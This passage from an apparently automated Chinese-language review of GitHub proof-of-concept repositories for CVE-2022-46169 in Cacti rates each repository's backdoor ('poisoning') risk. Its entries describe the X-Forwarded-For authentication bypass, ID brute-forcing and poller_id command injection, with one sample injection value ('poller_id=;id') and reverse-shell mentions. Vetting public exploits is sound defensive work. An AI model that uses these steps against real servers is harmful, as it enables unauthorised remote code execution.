*   `entrypoint.sh`：Docker容器的入口脚本，用于初始化Cacti数据库和设置权限，没有发现明显的恶意代码，但其中`mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"`语句禁用了管理员密码强制修改，这可能会降低安全性。

总体来说，该仓库的投毒风险较低，但入口脚本中禁用了管理员密码强制修改，存在潜在的安全风险。

投毒风险评估：5%。

**项目地址:** [Rickster5555/EH2-PoC](https://github.com/Rickster5555/EH2-PoC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #11

**来源**: [CVE-2022-46169-Safarchand_CVE-2022-46169.md](../2022/CVE-2022-46169-Safarchand_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个命令注入漏洞。攻击者可以通过构造`X-Forwarded-For`头绕过身份验证，然后利用`remote_agent.php`中的`polldata`操作注入恶意命令。该POC利用`X-Forwarded-For`头伪造客户端IP，绕过身份验证，然后通过`poller_id`参数向`proc_open`函数传递恶意payload，从而执行任意命令。POC尝试通过暴力破解`host_id`来找到一个可用的`poller_item`。代码中使用了`pexpect`来创建一个交互式的nc会话，以便接收反向shell。虽然使用了base64编码，但这是为了避免命令中的特殊字符导致问题，不是隐藏恶意代码，但是通过nc反弹shell存在被利用进行恶意操作的风险，因此存在一定的投毒风险，但是概率较低。整体而言，POC代码目的是为了验证漏洞存在，因此投毒概率较低，约为10%。

**漏洞利用方式：**

1.  **绕过认证：** 通过设置`X-Forwarded-For`头为Cacti服务器的IP地址，欺骗`get_client_addr`函数，绕过认证。
2.  **触发命令注入：**  向`remote_agent.php`发送包含`polldata` action的请求，并将恶意命令注入到`poller_id`参数中。  利用`proc_open`函数执行注入的命令。
3. **反弹shell:** 该poc通过反弹shell获得服务器控制权。

**项目地址:** [Safarchand/CVE-2022-46169](https://github.com/Safarchand/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #12

**来源**: [CVE-2022-46169-SystemVll_CVE-2022-46169.md](../2022/CVE-2022-46169-SystemVll_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头中的`Forwarded-For`字段，绕过身份验证，然后通过`remote_agent.php`文件中的`polldata`操作，并结合一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，将恶意命令注入到`proc_open`函数中执行，从而实现远程代码执行。

**漏洞利用方式:**
1.  **身份验证绕过:** 通过设置`Forwarded-For`等HTTP头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入:**  发送带有恶意`poller_id`参数的请求到`remote_agent.php?action=polldata`，该参数会被插入到`proc_open`函数执行的命令中。
3.  **寻找`POLLER_ACTION_SCRIPT_PHP`:**  漏洞利用的前提是存在一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。需要找到对应的`host_id`和`local_data_id`。

**有效性:**
根据漏洞描述，此漏洞利用代码利用了未经授权的远程代理来执行任意系统命令，因此有效。

**投毒风险:**
提供的代码段是 Apache 2.0 许可协议，不包含任何可执行代码或恶意代码，因此投毒风险为0%。核心的PoC代码并没有提供，因此无法判断攻击者是否进行了后门代码验证，只能判断提供的许可协议不存在投毒风险。

**项目地址:** [SystemVll/CVE-2022-46169](https://github.com/SystemVll/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #13

**来源**: [CVE-2022-46169-a1665454764_CVE-2022-46169.md](../2022/CVE-2022-46169-a1665454764_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行Cacti，并且存在具有 'POLLER_ACTION_SCRIPT_PHP' action类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经验证的远程命令执行漏洞。攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并在目标系统上执行任意命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`等HTTP Header, 伪造客户端 IP 地址，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以通过 `polldata` action，并控制 `poller_id` 参数，将恶意命令注入到 `proc_open` 函数的参数中，从而执行任意系统命令。
3.  **前提条件：** 漏洞利用需要存在一个 `poller_item`，其 `action` 字段设置为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。默认安装的Cacti，很可能存在满足此条件的`poller_item`。
4.  **POC有效性:** 提供的POC代码有效, 利用`remote_agent.php`，设置`X-Forwarded-For` header，构造包含恶意命令的URL,发送请求来执行命令。
5. **投毒风险:** README.md 为漏洞复现步骤，以及github仓库的使用方式说明。POC代码本身除了写入output.txt之外没有发现其他恶意行为。虽然存在一定的风险，例如该代码可能被恶意修改后传播，但当前提供的代码投毒概率较低，大约为1%。该POC的主要功能是检测漏洞是否存在并执行命令，而不是植入后门。

**项目地址:** [a1665454764/CVE-2022-46169](https://github.com/a1665454764/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #14

**来源**: [CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md](../2022/CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务可网络访问, 并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，然后利用`polldata`动作，通过构造恶意的`poller_id`参数，执行任意操作系统命令。漏洞利用的关键在于：

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证检查。这是因为`get_client_addr`函数会信任`HTTP_`开头的`$_SERVER`变量，导致可以伪造IP地址。
2.  **命令注入：** 一旦通过身份验证，攻击者可以向`remote_agent.php`发送带有`action=polldata`的请求，其中`poller_id`参数可以被注入恶意命令。程序会将这个参数传递给`proc_open`函数，从而执行攻击者提供的命令。
3.  **利用方式：**  提供的Python脚本首先检查目标是否易受攻击，然后使用提供的LHOST和LPORT生成反向shell有效负载。 脚本通过暴力破解`host_id`和`local_data_ids[]`，构造恶意的URL，发送到目标`remote_agent.php`，从而执行反向shell，从而在目标系统上获得shell访问权限。

**投毒风险分析：**

代码本身主要功能是实现漏洞利用，但仍然存在一定低概率的投毒风险：

*   **潜在的后门：** 虽然代码的主要目的是利用漏洞，但作者可能在payload构建过程中插入了额外的恶意代码，例如，在反向shell payload中添加了额外的命令，用于收集敏感信息或执行其他恶意操作。但是从代码来看，payload是根据用户输入的IP和端口构建的，自定义程度较高，因此payload中存在后门的概率较低。
*   **依赖风险：** 该脚本依赖于`requests`和`urllib`库。虽然这些都是常用的库，但如果这些库本身存在漏洞，或者作者使用了不安全的库函数，可能会引入安全风险。

总体而言，该POC代码的投毒风险较低，约为5%。主要风险在于payload构建过程中可能存在的隐蔽后门，以及对第三方库的依赖。

**项目地址:** [alv-david/CVE-2022-46169-Cacti-1.2.22](https://github.com/alv-david/CVE-2022-46169-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #15

**来源**: [CVE-2022-46169-antisecc_CVE-2022-46169.md](../2022/CVE-2022-46169-antisecc_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在`poller_item`记录，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (2)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中。攻击者可以通过设置 `X-Forwarded-For` HTTP 头绕过身份验证，然后利用 `polldata` 操作，将恶意命令注入到 `poller_id` 参数中，导致服务器执行任意命令。  

**有效性评估：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用的**有效性高**。漏洞库和搜索引擎结果都确认了该漏洞的存在和严重性，并且已经有公开的漏洞利用代码可用。提供的 Python 脚本 `CVE-2022-46169.py` 实现了漏洞利用过程，包括绕过身份验证和注入命令。  

**投毒风险分析：**

对提供的 Python 脚本进行分析，该脚本的主要功能是利用 CVE-2022-46169 漏洞，不存在明显的恶意代码或后门。但是，任何利用代码都存在被修改的风险，攻击者可能会在代码中添加恶意功能。考虑到代码量较少，逻辑清晰，用户可以容易地进行审查，因此，**投毒风险较低，估计为5%**。这个风险主要来自使用者没有进行代码审计就直接使用，例如添加反弹shell等恶意操作。

**利用方式：**

1.  **身份验证绕过：** 攻击者发送带有 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，伪造客户端 IP 地址，绕过身份验证。
2.  **命令注入：** 攻击者构造包含恶意命令的 `poller_id` 参数，通过 `polldata` 操作传递给 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器在处理 `polldata` 操作时，会将 `poller_id` 参数中的恶意命令注入到 `proc_open` 函数中，导致服务器执行任意命令。

**POC利用方式详细过程:**

1.  运行 `CVE-2022-46169.py` 脚本，指定目标 Cacti 实例的 URL 和要执行的命令。
2.  脚本会遍历一系列 `host_id`，并为每个 `host_id` 构建一个包含恶意 `poller_id` 参数的 HTTP GET 请求。
3.  脚本设置 `X-Forwarded-For` 头，伪造客户端 IP 地址，绕过身份验证。
4.  脚本发送 HTTP 请求到 `remote_agent.php`。
5.  如果目标 Cacti 实例存在具有 `POLLER_ACTION_SCRIPT_PHP` 操作类型的 `poller_item`，并且成功绕过身份验证，则服务器将执行 `poller_id` 参数中的恶意命令。
6.  脚本会检查响应中是否包含 "proc" 字符串，以确认命令是否已成功执行。
7.  如果命令执行成功，脚本将输出成功的消息，并显示成功利用的 `host_id`。

**项目地址:** [antisecc/CVE-2022-46169](https://github.com/antisecc/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #16

**来源**: [CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md](../2022/CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例配置了 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中的一个命令注入漏洞。该漏洞允许未经身份验证的攻击者在运行Cacti的服务器上执行任意代码。漏洞存在于`remote_agent.php`文件中，该文件可以通过发送特制的HTTP请求进行访问。攻击者可以通过操纵`X-Forwarded-For` header 绕过身份验证,然后通过 `poller_id`参数执行命令注入。PoC代码利用了这一漏洞，首先验证目标是否存在漏洞，然后暴力破解 `host_id`和 `local_data_id`。 一旦这些ID被找到，攻击者就可以构造包含恶意payload的请求，从而在服务器上执行任意命令。

**有效性:**  提供的PoC代码有效，能够成功利用漏洞实现未经身份验证的远程命令执行。

**投毒风险:**  PoC代码主要功能是漏洞利用，并没有发现明显的恶意投毒代码，例如植入后门、篡改数据等。`cacti.py`脚本的主要功能是：
1.  检测目标是否存在漏洞。
2.  爆破 `host_id` 和 `local_data_id`。
3.  执行命令注入。
代码中唯一的潜在风险点是执行命令注入的payload。如果用户在不知情的情况下使用了危险的payload，可能会对系统造成损害，但是这种风险是用户自身行为造成的，并非代码本身存在恶意。

**利用方式:**
1.  攻击者发送包含`X-Forwarded-For` header的HTTP请求到`remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式获取可用的 `host_id` 和 `local_data_id`，这些ID对应于`poller_item`表中 `action` 字段为 `POLLER_ACTION_SCRIPT_PHP` (2) 的记录。
3.  攻击者构造包含恶意payload的HTTP请求，通过`poller_id`参数进行命令注入，从而在服务器上执行任意命令。

**项目地址:** [ariyaadinatha/cacti-cve-2022-46169-exploit](https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #17

**来源**: [CVE-2022-46169-copyleftdev_PricklyPwn.md](../2022/CVE-2022-46169-copyleftdev_PricklyPwn.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti服务器存在启用了 POLLER_ACTION_SCRIPT_PHP 的 poller_item

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵 HTTP Header (例如 X-Forwarded-For) 绕过身份验证，并向 remote_agent.php 发送特制的请求，注入恶意命令。漏洞的根本原因是 remote_agent.php 文件中的 polldata 操作在处理 poller_id 参数时，没有进行充分的过滤，导致攻击者可以在 proc_open 函数中执行任意命令。提供的漏洞利用代码 (PricklyPwn) 使用 Go 编写，通过爆破 host_id 和 local_data_ids，构造包含恶意命令的 URL，利用该漏洞获取反向 shell。

**有效性分析：**
漏洞利用代码通过 X-Forwarded-For 头绕过认证, 并爆破`host_id`和`local_data_ids`参数，构造恶意 URL 触发命令注入。根据漏洞信息，利用代码应该是有效的。

**投毒风险分析：**
该仓库包含一个Go编写的漏洞利用程序和一个自述文件。漏洞利用程序的功能是利用 CVE-2022-46169 在 Cacti 上执行命令。Readme文件提供了有关如何使用该漏洞利用程序的信息。虽然代码本身旨在利用已知漏洞，但需要审查是否存在任何隐藏的恶意代码。
*   **main.go:** 代码逻辑清晰，主要功能是构造 Payload 并发送请求以利用漏洞。其中未发现明显的恶意代码。然而，不能完全排除代码中存在细微的后门或漏洞的可能性，例如不正确的错误处理可能导致拒绝服务。
*   **readme.md:** 自述文件只包含有关漏洞利用程序的信息，没有发现任何可疑内容。

考虑到代码主要功能是漏洞利用，但存在一定潜在风险，因此投毒风险评估为10%。

**利用方式：**
1.  攻击者首先需要找到一个存在漏洞的 Cacti 实例 (版本低于 1.2.23)。
2.  攻击者设置`X-Forwarded-For`头为 Cacti 服务器的 IP 地址来绕过身份验证。
3.  攻击者通过爆破`host_id`和`local_data_ids`参数，寻找action类型设置为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。
4.  构造包含恶意命令的 URL，将其作为 poller_id 参数的值传递给 remote_agent.php。
5.  Cacti 服务器执行恶意命令，例如启动反向 shell 连接到攻击者控制的服务器。

**项目地址:** [copyleftdev/PricklyPwn](https://github.com/copyleftdev/PricklyPwn)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #18

**来源**: [CVE-2022-46169-dawnl3ss_CVE-2022-46169.md](../2022/CVE-2022-46169-dawnl3ss_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统安装Cacti，且存在类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。漏洞存在于`remote_agent.php`文件中，攻击者可以通过`X-Forwarded-For`头绕过身份验证，然后通过构造恶意的`poller_id`参数，在`poll_for_data`函数中使用`proc_open`执行任意命令。

**有效性：**
提供的PoC代码有效。它首先检查目标是否易受攻击，然后进行暴力破解以查找`host_id`和`local_data_id`，最后构造包含恶意payload的URL来执行命令。

**投毒风险：**
PoC代码本身看起来相对干净，主要功能是利用漏洞。但任何时候都存在一定的风险。漏洞利用代码中存在一定的风险，例如，要求用户输入IP地址和端口，然后构造反向shell的payload。虽然这是漏洞利用的一部分，但用户在复制粘贴代码时可能没有意识到这一点。由于代码的目的是演示漏洞，因此将此定义为恶意投毒是不准确的。风险评估如下：
  * 代码逻辑的直接目的并不是植入后门或执行恶意操作，而是为了演示漏洞利用，大部分操作都需要用户交互。
  * 潜在风险较低，主要体现在用户不理解反向shell的含义，直接运行可能导致自身暴露。
总的来说，投毒风险较低，预估为5%。

**利用方式：**
1.  **身份验证绕过：** 攻击者设置`X-Forwarded-For`头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **查找有效ID：** 攻击者暴力破解`host_id`和`local_data_id`，找到`poller_item`表中`action`类型为`POLLER_ACTION_SCRIPT_PHP`的条目。
3.  **命令注入：** 攻击者构造包含恶意命令的`poller_id`参数，发送到`remote_agent.php`，服务器执行该命令。

**结论：** 此漏洞利用风险极高，因为无需身份验证即可远程执行代码。提供的PoC可以有效利用此漏洞，需要及时修补。

**项目地址:** [dawnl3ss/CVE-2022-46169](https://github.com/dawnl3ss/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #19

**来源**: [CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md](../2022/CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在具有POLLER_ACTION_SCRIPT_PHP action的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.23 之前的版本中。这是一个未经身份验证的命令注入漏洞，允许攻击者在服务器上执行任意代码。攻击者通过伪造 HTTP Header `X-Forwarded-For` 绕过身份验证，然后向 `remote_agent.php` 发送包含恶意 `poller_id` 的 POST 请求，该 `poller_id` 包含要执行的命令。 漏洞利用的关键在于 `remote_agent.php` 中对 `poller_id` 参数的不安全处理，以及对客户端 IP 地址验证的绕过。

提供的 PoC 代码通过 Go 语言实现，利用了该漏洞。它允许指定目标 Cacti 实例的 URL，以及要执行的命令。PoC 代码首先尝试绕过身份验证，然后构造包含恶意命令的 POST 请求。如果成功，服务器将执行该命令，并将结果返回给攻击者。

该PoC未发现明显的投毒代码。主要功能是构造HTTP请求，发送到目标服务器，然后解析返回结果。代码中没有发现任何尝试连接恶意服务器，执行恶意操作或者写入恶意文件的行为。 风险分析基于对提供的PoC代码本身的分析，并不能完全排除其他潜在的风险（例如，如果从不可信的源下载该PoC，则可能存在其他风险）。 因此，为了安全起见，最好人工审核代码，或者从可信的来源获取代码。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP Header 为 Cacti 服务器的 IP 地址来绕过身份验证。
2.  **命令注入：** 攻击者构造一个包含恶意命令的 `poller_id` 参数，并通过 POST 请求将其发送到 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器执行 `poller_id` 中包含的命令。

**漏洞利用有效性：**
根据漏洞描述、搜索结果和提供的PoC代码，此漏洞利用是有效的。PoC代码演示了如何利用此漏洞在目标系统上执行任意命令。



**项目地址:** [devAL3X/CVE-2022-46169_poc](https://github.com/devAL3X/CVE-2022-46169_poc)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #20

**来源**: [CVE-2022-46169-devilgothies_CVE-2022-46169.md](../2022/CVE-2022-46169-devilgothies_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在一个action类型为POLLER_ACTION_SCRIPT_PHP（值为2）的poller_item配置，并且可以通过HTTP访问remote_agent.php页面

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求头来绕过身份验证，并通过 `poller_id` 参数注入恶意命令。漏洞利用过程如下：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP 头，伪造客户端 IP 地址，使其与 Cacti 服务器本身的 IP 地址匹配。由于 Cacti 验证客户端 IP 地址的方式存在缺陷，攻击者可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 和恶意 `poller_id` 参数的请求。`poller_id` 参数中的值会被插入到 `proc_open` 函数的参数中，从而执行攻击者指定的命令。
3.  **利用代码分析：** 提供的PoC代码首先检查目标是否存在漏洞通过设置`X-Forwarded-For` http头。如果确认存在漏洞，则通过遍历`host_id`和`local_data_ids[]`来寻找配置正确的`poller_item`, 找到后，构造payload，执行反弹shell。
4. **投毒分析：** 检查PoC代码和README.md文件，未发现任何明显的恶意代码或后门。所有的代码都致力于利用此漏洞，没有发现有任何与预期功能不符的部分。因此，投毒风险评估为0%。

**总结：**
该漏洞允许未经身份验证的攻击者在目标系统上执行任意命令，风险极高。提供的PoC代码可以有效地利用该漏洞。该漏洞已被CISA列入已知被利用的漏洞目录（KEV）。

**项目地址:** [devilgothies/CVE-2022-46169](https://github.com/devilgothies/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #21

**来源**: [CVE-2022-46169-doosec101_CVE-2022-46169.md](../2022/CVE-2022-46169-doosec101_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中存在的一个未经身份验证的命令注入漏洞。漏洞位于`remote_agent.php`文件中。由于`get_client_addr`函数对客户端IP地址的验证不充分，攻击者可以通过设置`HTTP_`开头的`$_SERVER`变量来伪造IP地址，绕过身份验证。绕过身份验证后，攻击者可以通过`polldata`操作，利用`poller_id`参数中的命令注入漏洞，执行任意系统命令。

**漏洞利用方式：**
1.  攻击者发送包含`Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含恶意命令的`poller_id`参数，并将其作为`polldata`操作的一部分发送到`remote_agent.php`。
3.  服务器执行攻击者提供的恶意命令。

**有效性：**
提供的POC代码`CVE-2022-46169.py`是一个简单的漏洞检测脚本，它通过发送包含特定参数的HTTP GET请求到`remote_agent.php`来判断目标系统是否存在漏洞。该脚本并非完整的漏洞利用代码，但它可以用来验证目标系统是否容易受到攻击。

**投毒风险：**
分析了提供的POC代码和相关文件，没有发现明显的恶意代码或后门。`requirements.txt`中列出的依赖项`optparse`, `httpx`, `termcolor` 都是常见的Python库，没有已知的安全问题。作者隐藏的投毒代码可能性较低，风险评估为0%。

**项目地址:** [doosec101/CVE-2022-46169](https://github.com/doosec101/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #22

**来源**: [CVE-2022-46169-icebreack_CVE-2022-46169.md](../2022/CVE-2022-46169-icebreack_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行 (RCE)

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标服务器运行受影响版本的Cacti，且存在一个action类型为POLLER_ACTION_SCRIPT_PHP的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Cacti的remote_agent.php文件中。由于对客户端IP地址的验证存在缺陷，未经身份验证的攻击者可以通过设置X-Forwarded-For头部绕过身份验证，然后利用polldata动作中的命令注入漏洞执行任意命令。

**有效性：**
根据漏洞信息和提供的PoC代码，该漏洞是有效的。PoC代码利用了X-Forwarded-For头部的欺骗来绕过身份验证，然后通过构造包含恶意命令的poller_id参数来触发命令注入。

**投毒风险：**
PoC代码本身的功能是利用已知的漏洞进行攻击，并没有发现隐藏的恶意代码或后门。代码的功能较为清晰，主要包括发送HTTP请求、构造Payload等。因此，可以认为投毒风险为0%。

**利用方式：**
1.  攻击者发送包含`X-Forwarded-For`头的HTTP请求到`remote_agent.php`，将该头部设置为Cacti服务器的IP地址，绕过身份验证。
2.  攻击者构造一个包含恶意命令的`poller_id`参数，并将其作为GET请求参数发送到`remote_agent.php?action=polldata`。
3.  `remote_agent.php`在处理`polldata`动作时，会将`poller_id`参数插入到`proc_open`函数调用的命令中，导致命令注入。
4.  攻击者可以通过暴力破解`host_id`和`local_data_ids`参数，找到一个`action`类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，从而成功执行恶意命令。

**项目地址:** [icebreack/CVE-2022-46169](https://github.com/icebreack/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #23

**来源**: [CVE-2022-46169-lof1sec_CVE-2022-46169.md](../2022/CVE-2022-46169-lof1sec_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在具有POLLER_ACTION_SCRIPT_PHP（即action类型为2）的poller_item配置，并且攻击者可以访问remote_agent.php

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于Cacti的`remote_agent.php`文件中，允许未经身份验证的攻击者执行任意代码。利用方式如下：

1.  **身份验证绕过：** 攻击者通过伪造`X-Forwarded-For` HTTP头，将其设置为运行Cacti服务器的IP地址，从而绕过身份验证。这是因为`get_client_addr`函数会读取这些HTTP头来确定客户端IP地址，并且之后通过`gethostbyaddr`解析IP地址为主机名，而Cacti服务器自身的主机名通常在`poller`表中存在，导致验证通过。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以利用`polldata`动作，该动作会使用`proc_open`执行PHP脚本。攻击者可以通过`poller_id`参数注入恶意命令。例如，`poller_id=;id`将执行`id`命令。
3.  **前提条件：** 要触发命令注入，必须存在一个`poller_item`，其`action`字段设置为`POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id`和`local_data_id`可以通过暴力破解找到。

**有效性：**

提供的PoC代码利用了上述漏洞。首先，它检查目标是否容易受到攻击（`checkVuln`函数）。然后，它通过暴力破解（`bruteForce`函数）确定有效的`host_id`和`local_data_id`。最后，它使用精心设计的payload（`remoteCodeExecution`函数）将恶意命令注入到`poller_id`参数中，从而在服务器上执行任意代码。由于CVE细节和搜索结果确认了此漏洞，PoC代码应有效。

**投毒风险：**

查看PoC代码和相关的README文件，未发现任何恶意或可疑的代码。PoC代码仅包含利用CVE-2022-46169漏洞的代码。因此，投毒风险为0%。

**搜索引擎结果：**

搜索引擎结果证实了CVE-2022-46169是一个未经身份验证的命令注入漏洞，影响Cacti的早期版本。多个来源都强调了该漏洞已被积极利用。


**项目地址:** [lof1sec/CVE-2022-46169](https://github.com/lof1sec/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #24

**来源**: [CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md](../2022/CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md)

## CVE-2022-46169 - Cacti 未授权命令注入

